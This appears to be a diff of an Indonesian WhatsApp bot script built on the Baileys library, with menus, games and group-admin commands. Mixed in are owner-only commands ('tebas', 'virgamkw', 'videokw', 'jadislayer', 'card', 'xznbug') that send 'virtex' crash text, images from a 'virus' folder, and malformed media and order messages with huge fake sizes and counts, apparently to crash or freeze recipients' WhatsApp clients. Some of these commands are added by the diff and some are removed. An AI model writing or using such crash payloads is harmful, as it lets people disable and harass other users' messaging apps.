+udin.sendMessage(from, res, audio, {quoted : qul, mimetype: 'audio/mp4',duration:999.999, ptt:true})
+break
+case 'iri':
+reply(mess.wait)
+const irimp3 = fs.readFileSync('./assets/iri.mp3');
+udin.sendMessage(from, irimp3, MessageType.audio, {quoted: qul, mimetype: 'audio/mp4', duration: 99999999, ptt:true})
+break
 case 'MeNu🔥':
  rn = process.uptime()
-				const textnya = `
+const textnya = `
 ==>>Mohon Baca<<==
 
 JANGAN SPAM BOT INI !!..
@@ -896,10 +686,6 @@ randKey = jsonData[randIndex];
 hasil = await getBuffer(randKey.result)
 udin.sendMessage(from, hasil, image, {quoted: qul, caption: `GELAP BOS`})
 break
-case 'Random Animex🐈':
-buffer = await getBuffer(`http://hadi-api.herokuapp.com/api/anime`)
-udin.sendMessage(from, buffer, image, { quoted: qul, caption: `Onichan`})
-break
 case 'VIRGAM XZN 🔥':
 if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
 const vir = fs.readFileSync(`./virgam.jpg`)
@@ -939,21 +725,11 @@ lok = ppp.split("|")[0];
 udin.sendMessage(from, {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:send,address:lok}, MessageType.location)
 break
 case 'CEK BOT 🖥️':
-/*let timestamp = speed();
-let latensi = speed() - timestamp
-run = process.uptime()
-let ruun = xznsenpai.runtime(run)
-replyy(`*PING BOT*\n\nSpeed: ${latensi.toFixed(4)}second\n\n*BOT AKTIF SELAMA*:\n\n${ruun}\n\n*Auto respon* : ${autorespon ? 'Off' : 'On'}`)*/
 let i = []
 let giid = []
-for (mem of totalchat){
-i.push(mem.jid)
-}
+for (mem of totalchat){i.push(mem.jid)}
 for (id of i){
-if (id && id.includes('g.us')){
-giid.push(id)
-}
-}
+if (id && id.includes('g.us')){giid.push(id)}}
 let timestampi = speed();
 let latensii = speed() - timestampi
 const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = udin.user.phone
@@ -973,7 +749,7 @@ teskny = `
 *Total Chat :* ${totalchat.length}
 *Speed :* ${latensii.toFixed(4)} Second
 *Runtime :* ${xznsenpai.runtime(anu)}`
-fyt2(teskny)
+replyy(teskny)
 break
 case 'TRUTH 🐤':
 const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
@@ -1107,10 +883,6 @@ TETAP DI RUMAH AJA DAN LAKUKAN 3M
 					   }
 					    mentions(teks, members_id, true)
 					    break
-					case 'k6Yq20yhuPXs2ex8xohbdUPFw38v9epTEl+VQEI0qu8=':
-					buffer = await getBuffer(`http://hadi-api.herokuapp.com/api/anime`)
-                    udin.sendMessage(from, buffer, image, { quoted: qul})
-                    break
 					//hidetag
 					    case 'SMU3B4acNBuZmzP5pjj1d0A0wdra0UEbH9jQbXS3gVo=':
 					    if (!isGroup) return reply("dalam group")
@@ -1119,93 +891,6 @@ TETAP DI RUMAH AJA DAN LAKUKAN 3M
 				        break
 	           } 
  switch (command) {
-			/*case 'menu':
-			const llol = fs.readFileSync(`./media/xznsenpai.jpeg`)
-			rn = process.uptime()
-				const textnya = `
-==>>Mohon Baca<<==
-
-JANGAN SPAM BOT INI !!..
-TETAP DI RUMAH AJA DAN LAKUKAN 3M
-1.makan
-2.minum
-3.MELIHAT MEMEG
-
-=>>JAM<<=
-
-⦿ Jam WIT : ${wit}
-⦿ Jam WITA : ${wita}
-⦿ Jam WIB : ${jam}
-⦿ Hari : ${week} ${weton}
-⦿ Kalender : ${date}
-⦿Runtime : ${xznsenpai.runtime(rn)}
-
-=>>Pembuat Sticker<<=
-
-1.${prefix}sticker
-2.${prefix}toimg
-
-=>>DOWNLOAD<<=
-
-1.${prefix}play
-2.${prefix}video
-3.${prefix}ytmp4
-4.${prefix}ytmp3
-5.${prefix}ttnowm
-6.${prefix}igdl
-
-=>>YNTKTS<<=
-
-1.${prefix}darkjokes
-2.${prefix}lirik
-3.${prefix}ytsearch
-4.${prefix}pinterest
-5.${prefix}playstore
-6.${prefix}truth
-7.${prefix}dare
-
-=>>HANYA ADMIN<<=
-
-1.${prefix}kick
-2.${prefix}add
-3.${prefix}group buka/tutup
-4.${prefix}welcome
-
-=>>MAKER<<=
-
-1.${prefix}dota
-2.${prefix}aov
-
-*Xᴢɴ々Bᴏᴛ*`
-fyt2(textnya)*/
-//udin.sendMessage(from, llol, image, {quoted: qul, caption: textnya, contextInfo: { forwardingScore: 250, isForwarded: true,  externalAdReply: { title: 'Duta TeyTed Tzy', body: '𐎑⃢BY;🇮🇩𝐱𝐳𝐧𝐬𝐞𝐧𝐩𝐚𝐢🇮🇩☙', sourceUrl: `https://wa.me/6282256080304?text=Assalamualaikum`, thumbnail: fs.readFileSync('./media/loli.jpeg') }}})
-//udin.sendMessage(from, llol, image, {quoted: qul, caption: textnya, contextInfo:{"externalAdReply":{"title": `${ucapanWaktu} ${pushname}`, mediaType: 2, "thumbnailUrl": "https://telegra.ph/file/6b0259fd741e108910fbe.jpg","previewType": "VIDEO","mediaUrl": `https://youtu.be/5odMRQDrhoI`}}})
-/*res = await udin.prepareMessageFromContent(from, {
-					"orderMessage": {
-						"orderId": "792749621388119",
-						"sellerJid": "6282255794209@s.whatsapp.net",
-						"thumbnail": fs.readFileSync('./media/xznsenpai.jpeg'),
-						"itemCount": 99,
-						"status": "INQUIRY",
-						"surface": "CATALOG",
-						"message": `${textnya}`,
-						"orderTitle": "𝙓𝙕𝙉 𝙎𝙀𝙉𝙋??𝙄",
-						"token": "AR7lxB+W/oR81b6ENZgc3dQdr+XrCDQptYJnZEKf3oWcBg=="
-						 },
-                "contextInfo": {
-               "forwardingScore": 3,
-               "isForwarded": true
-                }
-                }, {quoted:fgclink, contextInfo:{}}) 
-                udin.relayWAMessage(res)*/
-                //replyy(textnya)
-                //xznsenpai.FakeTokoForwarded(from, textnya, fake)
-                //xznsenpai.sendFakeStatusWithImg(from, lord, textnya, fake)
-				//break
-/*api gw sendiri*/
-/*case 'button':
-	send3Button(`Ini contoh buttonsMessage`, `:v`, `Menu Bot`, `${prefix}menu`, `Tes Speed`, `${prefix}ping`, `Cek Runtime`, `${prefix}runtime`, { quoted: qul })
-	break*/
 case 'addcmd':
 case 'setcmd':
 if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
@@ -1233,7 +918,7 @@ case 'help': case 'menu':
 "description": `\n==>>Mohon Baca<<==\n\nJANGAN SPAM BOT INI !!..\nTETAP DI RUMAH AJA DAN LAKUKAN 3M\n1.makan\n2.minum\n3.MELIHAT MEMEG\n\n=>>JAM<<=\n\n⦿ Jam WIT : ${wit}\n⦿ Jam WITA : ${wita}\n⦿ Jam WIB : ${jam}\n⦿ Hari : ${week} ${weton}\n⦿ Kalender : ${date}`,
 "buttonText": "MENU🗿",
  "listType": "SINGLE_SELECT",
- "sections": [ {"title": `${week} ${date}`, "rows": [ { "title": `MeNu🔥`, "rowId": 0 }, { "title": "INFO🗿", "rowId": 0 }, { "title": "KONTAK OWNER🗿", "rowId": 0 }, { "title": "DONASI🗿", "rowId": 0 }, { "title": `Random Animex🐈`, "rowId": 0 }, { "title": `Darkjokes 🗿`, "rowId": 0 }, { "title": `Open Group`, "rowId": 0 }, { "title": `Close Group`, "rowId": 0 }, { "title": `CEK BOT 🖥️`, "rowId": 0 }, { "title": `TRUTH 🐤`, "rowId": 0 }, { "title": `DARE 🐤`, "rowId": 0 }
+ "sections": [ {"title": `${week} ${date}`, "rows": [ { "title": `MeNu🔥`, "rowId": 0 }, { "title": "INFO🗿", "rowId": 0 }, { "title": "KONTAK OWNER🗿", "rowId": 0 }, { "title": "DONASI🗿", "rowId": 0 }, { "title": `Darkjokes 🗿`, "rowId": 0 }, { "title": `Open Group`, "rowId": 0 }, { "title": `Close Group`, "rowId": 0 }, { "title": `CEK BOT 🖥️`, "rowId": 0 }, { "title": `TRUTH 🐤`, "rowId": 0 }, { "title": `DARE 🐤`, "rowId": 0 }
   ]
   }]}}, {}) 
  udin.relayWAMessage(Testbang, {waitForAck: true})
@@ -2183,7 +1868,6 @@ break
                 }, {quoted:flokasi, contextInfo:{}}) 
                 udin.relayWAMessage(njir)
 				break
-				
 			case 'kontak':
 				argz = arg.split('|')
 				if (!argz) return xznsenpai.reply(from, `Penggunaan ${prefix}kontak @tag atau nomor|nama`, qul)
@@ -2541,79 +2225,39 @@ break
                 const response = udin.sendMessage(from, "Awokawok", "conversation", { quoted: dinn })
                 }
                break*/
-				case 'tebas':
-				if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
-				const lol = fs.readFileSync(`./media/xznsenpai.jpeg`)
-               await udin.toggleDisappearingMessages(from)
-               udin.sendMessage(from, lol, image, { quoted: dinn, caption: virtex()})
-               break
-               case 'once':
-               res = await udin.prepareMessageFromContent(from, {
-              "imageMessage": {
-              "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
-               "mimetype": "image/jpeg",
-               "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
-                "fileLength": "9999999999",
-                "height": 1080,
-                "width": 1079,
-                "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
-                "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
-                "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
-                "mediaKeyTimestamp": "1610993486",
-                "humbnail": fs.readFileSync('./media/xznsenpai.jpeg'),
-                "viewOnce": true
-                        }
-                     }, {quoted: flokasi, contextInfo:{}}) 
-                  udin.relayWAMessage(res)
-                  break
-                case 'virgamkw':
-                res = await udin.prepareMessageFromContent(from, {
-          "imageMessage": {
-         "url": "https://mmg.whatsapp.net/d/f/AifAWCqQRbuzRbKq7eyy_Ony2nKj2pskheEJo9J6J1ff.enc",
-            "mimetype": "image/jpeg",
-            "caption": "Ni dah jadi bwang",
-            "fileSha256": "ZMfb5z5mHxnojNHeb2xy5J+YPodUtKcq6USLub9yB+g=",
-            "fileLength": "999999999999999999",
-            "mediaKey": "utKqxsHCcRJxtarxzLysAvIIee8qjemoxjphX0NDm60=",
-            "fileEncSha256": "OnjcPiCDbtLQ3acEO6n9GyyM9OOrA8vaPpH7DQ+npEs=",
-            "jpegThumbnail": fs.readFileSync('./virus/virgam.jpg'),
-        }
-                     }, {quoted: flokasi, contextInfo:{}}) 
-                  udin.relayWAMessage(res)
-                  break
-                  case 'videokw':
-                  res = await udin.prepareMessageFromContent(from, {
-          "videoMessage": {
-            "url": "https://mmg.whatsapp.net/d/f/AgYInUL3E75kU-OkMuqbSOA2IeuNZoDEudth0PjKngpj.enc",
-            "mimetype": "video/mp4",
-            "fileSha256": "jecELkOrxScyYz6RPZs3cuynz7mhdQg/GfBQCNHxo6k=",
-            "fileLength": "999999999999999999",
-            "seconds": 999999999,
-            "mediaKey": "jFFm13B3ewOXyI95VAr/plNcwFV8PYSSQLunEYHkl4Q=",
-            "height": 640,
-            "width": 304,
-            "fileEncSha256": "JZy9+ev1Ux5ffs6fhkrOSuZHQQsJ+myYWppIMj1eBvk=",
-            "directPath": "/v/t62.7161-24/19275655_536141770831084_6512679268886376533_n.enc?ccb=11-4&oh=3b6b86a2f07d95493f3abb15e5307b82&oe=615841A6",
-            "mediaKeyTimestamp": "1630647498",
-            "jpegThumbnail": fs.readFileSync('./virus/virgam.jpg'),
-            "streamingSidecar": "hMJdcC50QV8KDiQrf/VqYEJ9tujwgFq2kG6MpqvtLl7SkFkyPTE0Mpr4wVfm26l+hEAyOAHIKGrSXkdRWwLlFVqzFCD6y1VL4MwtHcs3T1/v0+fjUUZY2/Qlrs+C05xNELJjuDpVwjViLpG9aVJcR5QRiXNgUj5o"
-          }
-                     }, {quoted: qul, contextInfo:{}}) 
-                  udin.relayWAMessage(res)
-                  break
-               case 'katalog':
-               case 'jadislayer':
-               if (!isOwner) return xznsenpai.reply(from, 'Anda Bukan XznSenpai', qul)
-               replyy(mess.wait)
-				if ((isMedia && !qul.message.videoMessage || isQuotedImage)) {
-			   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(qul).replace('quotedM','m')).message.extendedTextMessage.contextInfo : qul
-			   let media = await udin.downloadMediaMessage(encmedia)
-               imeu = await udin.prepareMessage('0@s.whatsapp.net', media, image, {thumbnail: fs.readFileSync("./virus/virgam.jpg")})
-               imeg = imeu.message.imageMessage
-               res = await udin.prepareMessageFromContent(from,{"productMessage": { "product": {"productImage": imeg, "title": "Xᴢɴ々SᴇɴPɑɪ", "description": virtexapi(), "retailerId": "github.com/xznsenpai", "descriptionCount": "999999999", "productImageCount": "1", }, "businessOwnerJid": "6282256080304@s.whatsapp.net", "contextInfo": {"forwardingScore": 9999, "isForwarded": true}}}, {quoted: qul})
-               udin.relayWAMessage(res)}
-               else {xznsenpai.reply(from, `Kirim gambar atau reply dengan caption ${prefix}jadislayer`, qul)}
-               break
+case 'tebas':
+if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
+const lol = fs.readFileSync(`./media/xznsenpai.jpeg`)
+await udin.toggleDisappearingMessages(from)
+udin.sendMessage(from, lol, image, { quoted: dinn, caption: virtex()})
+break
+case 'virgamkw':
+res = await udin.prepareMessageFromContent(from, {"imageMessage": {"url": "https://mmg.whatsapp.net/d/f/AifAWCqQRbuzRbKq7eyy_Ony2nKj2pskheEJo9J6J1ff.enc", "mimetype": "image/jpeg", "caption": "Ni dah jadi bwang", "fileSha256": "ZMfb5z5mHxnojNHeb2xy5J+YPodUtKcq6USLub9yB+g=", "fileLength": "999999999999999999", "mediaKey": "utKqxsHCcRJxtarxzLysAvIIee8qjemoxjphX0NDm60=", "fileEncSha256": "OnjcPiCDbtLQ3acEO6n9GyyM9OOrA8vaPpH7DQ+npEs=", "jpegThumbnail": fs.readFileSync('./virus/virgam.jpg')}}, {quoted: flokasi, contextInfo:{}}) 
+udin.relayWAMessage(res)
+break
+case 'videokw':
+res = await udin.prepareMessageFromContent(from, {"videoMessage": {"url": "https://mmg.whatsapp.net/d/f/AgYInUL3E75kU-OkMuqbSOA2IeuNZoDEudth0PjKngpj.enc", "mimetype": "video/mp4", "fileSha256": "jecELkOrxScyYz6RPZs3cuynz7mhdQg/GfBQCNHxo6k=", "fileLength": "999999999999999999", "seconds": 999999999, "mediaKey": "jFFm13B3ewOXyI95VAr/plNcwFV8PYSSQLunEYHkl4Q=", "height": 640, "width": 304, "fileEncSha256": "JZy9+ev1Ux5ffs6fhkrOSuZHQQsJ+myYWppIMj1eBvk=", "directPath": "/v/t62.7161-24/19275655_536141770831084_6512679268886376533_n.enc?ccb=11-4&oh=3b6b86a2f07d95493f3abb15e5307b82&oe=615841A6", "mediaKeyTimestamp": "1630647498", "jpegThumbnail": fs.readFileSync('./virus/virgam.jpg'), "streamingSidecar": "hMJdcC50QV8KDiQrf/VqYEJ9tujwgFq2kG6MpqvtLl7SkFkyPTE0Mpr4wVfm26l+hEAyOAHIKGrSXkdRWwLlFVqzFCD6y1VL4MwtHcs3T1/v0+fjUUZY2/Qlrs+C05xNELJjuDpVwjViLpG9aVJcR5QRiXNgUj5o"}}, {quoted: qul, contextInfo:{}}) 
+udin.relayWAMessage(res)
+break
+case 'katalog':
+case 'jadislayer':
+if (!isOwner) return xznsenpai.reply(from, 'Anda Bukan XznSenpai', qul)
+ replyy(mess.wait)
+if ((isMedia && !qul.message.videoMessage || isQuotedImage)) {
+let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(qul).replace('quotedM','m')).message.extendedTextMessage.contextInfo : qul
+let media = await udin.downloadMediaMessage(encmedia)
+imeu = await udin.prepareMessage('0@s.whatsapp.net', media, image, {thumbnail: fs.readFileSync("./virus/virgam.jpg")})
+imeg = imeu.message.imageMessage
+res = await udin.prepareMessageFromContent(from,{"productMessage": { "product": {"productImage": imeg, "title": "Xᴢɴ々SᴇɴPɑɪ", "description": virtexapi(), "retailerId": "github.com/xznsenpai", "descriptionCount": "999999999", "productImageCount": "1", }, "businessOwnerJid": "6282256080304@s.whatsapp.net", "contextInfo": {"forwardingScore": 9999, "isForwarded": true}}}, {quoted: qul})
+udin.relayWAMessage(res)}
+else {xznsenpai.reply(from, `Kirim gambar atau reply dengan caption ${prefix}jadislayer`, qul)}
+break
+case 'card':
+if (!isOwner) return xznsenpai.reply(from, 'Anda Bukan XznSenpai', qul)
+for (let i = 0; i < 5; i++) {
+njir = await udin.prepareMessageFromContent(from, {"orderMessage": {"orderId": "792749621388119", "sellerJid": "6282256080304@s.whatsapp.net", "thumbnail": fs.readFileSync('./virus/virgam.jpg'), "itemCount": 99, "status": "INQUIRY", "surface": "CATALOG", "message": `${arg}`, "orderTitle": "𝙓𝙕𝙉 𝙎𝙀𝙉𝙋𝘼??", "token": "AR7lxB+W/oR81b6ENZgc3dQdr+XrCDQptYJnZEKf3oWcBg==" }, "contextInfo": {"forwardingScore": 3, "isForwarded": true }}, {quoted:flokasi, contextInfo:{}}) 
+udin.relayWAMessage(njir)}
+break
                case 'anu':
                if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
                await udin.toggleDisappearingMessages(from)
@@ -2637,93 +2281,11 @@ break
                 udin.relayWAMessage(res)
                 break
 				case 'xzn':
-				case 'xznwar':
+				case 'xznbug':
 				if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
-                await udin.toggleDisappearingMessages(from)
-                await udin.toggleDisappearingMessages(from)
-                await udin.toggleDisappearingMessages(from)
-                await udin.toggleDisappearingMessages(from)
-                await udin.toggleDisappearingMessages(from)
-                await udin.toggleDisappearingMessages(from)
-                await udin.toggleDisappearingMessages(from)
-                await udin.toggleDisappearingMessages(from)
-                await udin.toggleDisappearingMessages(from)
-                await udin.toggleDisappearingMessages(from)
-                await udin.toggleDisappearingMessages(from)
-                await udin.toggleDisappearingMessages(from)
-                await udin.toggleDisappearingMessages(from)
-                await udin.toggleDisappearingMessages(from)
-                await udin.toggleDisappearingMessages(from)
-                await udin.toggleDisappearingMessages(from)
-                await udin.toggleDisappearingMessages(from)
-                await udin.toggleDisappearingMessages(from)
-                await udin.toggleDisappearingMessages(from)
-                await udin.toggleDisappearingMessages(from)
-                //xznsenpai.reply(from, `by ꭙࣼznsenpɑi.in`, qul)
-                //xznsenpai.sendFakeStatus(from, `ꭙࣼznsenpɑi.in`, fake)
-                udin.sendMessage(from, virtex(), MessageType.text, { quoted: dinn })
-                res = await udin.prepareMessageFromContent(from, {
-					"orderMessage": {
-						"orderId": "792749621388119",
-						"sellerJid": "6282256080304@s.whatsapp.net",
-						"itemCount": 999999,
-						"status": "INQUIRY",
-						"surface": "CATALOG",
-						"message": `${virtex()}`,
-						"orderTitle": "𝙓𝙕𝙉 𝙎𝙀𝙉𝙋𝘼𝙄",
-						 "token": "AR7lxB+W/oR81b6ENZgc3dQdr+XrCDQptYJnZEKf3oWcBg=="
-						 },
-                "contextInfo": {
-               "forwardingScore": 3,
-               "isForwarded": true
-                }
-                }, {quoted:dinn, contextInfo:{}}) 
-                udin.relayWAMessage(res)
+                for (let i = 0; i < 5; i++) {await udin.toggleDisappearingMessages(from)}
+                reply('nani bang')
                 break
-				case 'xzntroli':
-				case '.':
-                          if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
-                          teks = args.join(' ')
-                          udin.sendMessage(qul.key.remoteJid, `${teks}`,MessageType.extendedText,{
-                          quoted: {
-                          key : {
-                          participant : '0@s.whatsapp.net'
-                        },
-                            message: {
-                            orderMessage: {
-                            itemCount : -9999999999,
-                            status: 1,
-                            surface : 1,
-                            message: ' ZainudinTanisha ',
-                            orderTitle: 'Meresahkan',
-                            sellerJid: '0@s.whatsapp.net'
-          
-                          }
-                        }
-                      }
-                    })
-                          await udin.toggleDisappearingMessages(from)
-                          await udin.toggleDisappearingMessages(from)
-                          teks = args.join(' ')
-                          udin.sendMessage(qul.key.remoteJid, `${teks}`,MessageType.extendedText,{
-                          quoted: {
-                          key : {
-                          participant : '0@s.whatsapp.net'
-                        },
-                            message: {
-                            orderMessage: {
-                            itemCount : +999999999,
-                            status: 1,
-                            surface : 1,
-                            message: ' ZainudinTanisha ',
-                            orderTitle: 'Meresahkan',
-                            sellerJid: '0@s.whatsapp.net'
-          
-                          }
-                        }
-                      }
-                    })
-                  break
                   case 'sharelock':
                   ppp = `${args.join(' ')}`
                   send = ppp.split("|")[0];
@@ -3323,11 +2885,8 @@ case 'ttt':
           reply("sukses")
           break
 			default:
-			//if (!isMybot) return
-
         if (isTTT && isPlayer2) {
-            //if (budy.startsWith("Y")){
-            	if (chats.startsWith('Y')){
+        if (chats.startsWith('Y')){
               tto = roomttt.filter(gang => gang.id.includes(from))
               tty = tto[0]
               number = tto[0].number;
@@ -3430,22 +2989,14 @@ giliran = @${tty.player1.split('@')[0]}`
               rooms = roomttt.filter(hhg => !hhg.id.includes(from))
               return roomttt = rooms 
             }
-            if (number[1] == s && number[2] == s && number[3] == s) return winningspeech()
-            
-            if (number[1] == s && number[4] == s && number[7] == s) return winningspeech()
-            
-            if (number[1] == s && number[5] == s && number[9] == s) return winningspeech()
-            
-            if (number[2] == s && number[5] == s && number[8] == s) return winningspeech()
-            
-            if (number[4] == s && number[5] == s && number[6] == s) return winningspeech()
-            
-            if (number[7] == s && number[8] == s && number[9] == s) return winningspeech()
-            
-            if (number[3] == s && number[5] == s && number[7] == s) return winningspeech()
-            
-            if (number[3] == s && number[6] == s && number[9] == s) return winningspeech()
-            
+            if (number[1] == s && number[2] == s && number[3] == s) return winningspeech()        
+            if (number[1] == s && number[4] == s && number[7] == s) return winningspeech()            
+            if (number[1] == s && number[5] == s && number[9] == s) return winningspeech()            
+            if (number[2] == s && number[5] == s && number[8] == s) return winningspeech()            
+            if (number[4] == s && number[5] == s && number[6] == s) return winningspeech()          
+            if (number[7] == s && number[8] == s && number[9] == s) return winningspeech()         
+            if (number[3] == s && number[5] == s && number[7] == s) return winningspeech()          
+            if (number[3] == s && number[6] == s && number[9] == s) return winningspeech()           
             if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !ttt.includes('5️⃣') && !ttt.includes('6️⃣') && !ttt.includes('7️⃣') && !ttt.includes('8️⃣') && !ttt.includes('9️⃣')){
               ucapan1 = `*[ Hasil pertandingan Tic Tac Toe ]*\n\npermainan seri Good Game\n`
               ucapan2 = `*[ Papan Hasil akhir ]*\n\n${ttt}`
@@ -3464,12 +3015,157 @@ giliran = @${tty.player1.split('@')[0]}`
         } catch (err) {
         e = String(err)
             if (!e.includes("this.isZero")) {
-	console.log(color('[ ERROR ]', 'red'), e)
-	// console.log(e)
-	}
-    }
-})
+	console.log(color('[ ERROR ]', 'red'), e)}}})
     //} catch (err) {
         //console.log(color('[ERROR]', 'red'), err)
     //}
 //})    
+
+
+//INI JANGAN DI CUBA KARNA BASE TIDAK SOPORT 
+
+//send 1 button
+/*const sendButton = async(content, footer, button1, row1, options = {}) => {
+      buttons = [
+        { buttonId: row1, buttonText: { displayText: button1 }, type: 1 }
+      ]
+      buttonMessage = {
+        contentText: content,
+        footerText: footer,
+        buttons: buttons,
+        headerType: 1
+      }
+      await udin.sendMessage(from, buttonMessage, MessageType.buttonsMessage, { ...options })
+    }*/
+//send 2 button
+/*const send2Button = async(content, footer, button1, row1, button2, row2, options = {}) => {
+      buttons = [
+        { buttonId: row1, buttonText: { displayText: button1 }, type: 1 },
+        { buttonId: row2, buttonText: { displayText: button2 }, type: 1 }
+      ]
+      buttonMessage = {
+        contentText: content,
+        footerText: footer,
+        buttons: buttons,
+        headerType: 1
+      }
+      await udin.sendMessage(from, buttonMessage, MessageType.buttonsMessage, { ...options })
+    }*/
+//send 3 button
+/*const send3Button = async(content, footer, button1, row1, button2, row2, button3, row3, options = {}) => {
+      buttons = [
+        { buttonId: row1, buttonText: { displayText: button1 }, type: 1 },
+        { buttonId: row2, buttonText: { displayText: button2 }, type: 1 },
+        { buttonId: row3, buttonText: { displayText: button3 }, type: 1 }
+      ]
+      buttonMessage = {
+        contentText: content,
+        footerText: footer,
+        buttons: buttons,
+        headerType: 1
+      }
+      await udin.sendMessage(from, buttonMessage, MessageType.buttonsMessage, { ...options })
+    }*/
+//send gambar + button
+/*const sendButtonImg = async(content, url, footer, button1, row1, options = {}) => {
+      m = await hexa.prepareMessage(from, await (await fetch(url)).buffer(), MessageType.image)
+      buttons = [
+        { buttonId: row1, buttonText: { displayText: button1 }, type: 1 }
+      ]
+      buttonMessage = {
+        contentText: content,
+        footerText: footer,
+        buttons: buttons,
+        headerType: 4,
+        imageMessage: m.message.imageMessage
+      }
+      await udin.sendMessage(from, buttonMessage, MessageType.buttonsMessage, { ...options })
+    }*/
+
+/*case 'menu':
+			const llol = fs.readFileSync(`./media/xznsenpai.jpeg`)
+			rn = process.uptime()
+				const textnya = `
+==>>Mohon Baca<<==
+
+JANGAN SPAM BOT INI !!..
+TETAP DI RUMAH AJA DAN LAKUKAN 3M
+1.makan
+2.minum
+3.MELIHAT MEMEG
+
+=>>JAM<<=
+
+⦿ Jam WIT : ${wit}
+⦿ Jam WITA : ${wita}
+⦿ Jam WIB : ${jam}
+⦿ Hari : ${week} ${weton}
+⦿ Kalender : ${date}
+⦿Runtime : ${xznsenpai.runtime(rn)}
+
+=>>Pembuat Sticker<<=
+
+1.${prefix}sticker
+2.${prefix}toimg
+
+=>>DOWNLOAD<<=
+
+1.${prefix}play
+2.${prefix}video
+3.${prefix}ytmp4
+4.${prefix}ytmp3
+5.${prefix}ttnowm
+6.${prefix}igdl
+
+=>>YNTKTS<<=
+
+1.${prefix}darkjokes
+2.${prefix}lirik
+3.${prefix}ytsearch
+4.${prefix}pinterest
+5.${prefix}playstore
+6.${prefix}truth
+7.${prefix}dare
+
+=>>HANYA ADMIN<<=
+
+1.${prefix}kick
+2.${prefix}add
+3.${prefix}group buka/tutup
+4.${prefix}welcome
+
+=>>MAKER<<=
+
+1.${prefix}dota
+2.${prefix}aov
+
+*Xᴢɴ々Bᴏᴛ*`
+fyt2(textnya)*/
+//udin.sendMessage(from, llol, image, {quoted: qul, caption: textnya, contextInfo: { forwardingScore: 250, isForwarded: true,  externalAdReply: { title: 'Duta TeyTed Tzy', body: '𐎑⃢BY;🇮🇩𝐱𝐳𝐧𝐬𝐞𝐧𝐩𝐚𝐢🇮🇩☙', sourceUrl: `https://wa.me/6282256080304?text=Assalamualaikum`, thumbnail: fs.readFileSync('./media/loli.jpeg') }}})
+//udin.sendMessage(from, llol, image, {quoted: qul, caption: textnya, contextInfo:{"externalAdReply":{"title": `${ucapanWaktu} ${pushname}`, mediaType: 2, "thumbnailUrl": "https://telegra.ph/file/6b0259fd741e108910fbe.jpg","previewType": "VIDEO","mediaUrl": `https://youtu.be/5odMRQDrhoI`}}})
+/*res = await udin.prepareMessageFromContent(from, {
+					"orderMessage": {
+						"orderId": "792749621388119",
+						"sellerJid": "6282255794209@s.whatsapp.net",
+						"thumbnail": fs.readFileSync('./media/xznsenpai.jpeg'),
+						"itemCount": 99,
+						"status": "INQUIRY",
+						"surface": "CATALOG",
+						"message": `${textnya}`,
+						"orderTitle": "𝙓𝙕𝙉 𝙎𝙀𝙉𝙋??𝙄",
+						"token": "AR7lxB+W/oR81b6ENZgc3dQdr+XrCDQptYJnZEKf3oWcBg=="
+						 },
+                "contextInfo": {
+               "forwardingScore": 3,
+               "isForwarded": true
+                }
+                }, {quoted:fgclink, contextInfo:{}}) 
+                udin.relayWAMessage(res)*/
+                //replyy(textnya)
+                //xznsenpai.FakeTokoForwarded(from, textnya, fake)
+                //xznsenpai.sendFakeStatusWithImg(from, lord, textnya, fake)
+				//break
+/*api gw sendiri*/
+/*case 'button':
+	send3Button(`Ini contoh buttonsMessage`, `:v`, `Menu Bot`, `${prefix}menu`, `Tes Speed`, `${prefix}ping`, `Cek Runtime`, `${prefix}runtime`, { quoted: qul })
+	break*/
